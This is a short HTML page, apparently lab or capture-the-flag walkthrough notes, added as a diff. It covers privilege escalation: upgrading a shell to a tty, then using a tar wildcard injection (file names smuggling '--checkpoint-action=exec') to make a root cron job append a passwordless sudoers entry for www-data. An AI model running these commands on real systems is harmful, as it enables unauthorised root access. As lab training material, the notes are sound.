@@ -1,0 +1,26 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>3 Privilege Escalation</title>
+</head><body>Upgrade the shell to full tty<ul><li>python -c 'import pty; pty.spawn("/bin/bash")'</li>
+<li>export TERM=xterm</li>
+<li>CTRL+Z</li>
+<li>stty raw -echo;fg</li>
+</ul>
+<br/>
+On the milesdyson's directory, there is a backup folder <br/>
+<img src="image.png" /><br/>
+<br/>
+cat /etc/crontab/<br/>
+<img src="image_2.png" width="700" height="265" /><br/>
+<br/>
+cd /var/www/html<br/>
+echo 'echo “www-data ALL=(root) NOPASSWD: ALL” &gt;&gt; /etc/sudoers' &gt; sudo.sh<br/>
+touch "/var/www/html/--checkpoint-action=exec=sh sudo.sh"<br/>
+touch "/var/www/html/--checkpoint=1"<br/>
+<br/>
+Wait for a minute and then type sudo su command to become root access<br/>
+<br/>
+<img src="image_3.png" /><br/>
+</body></html>
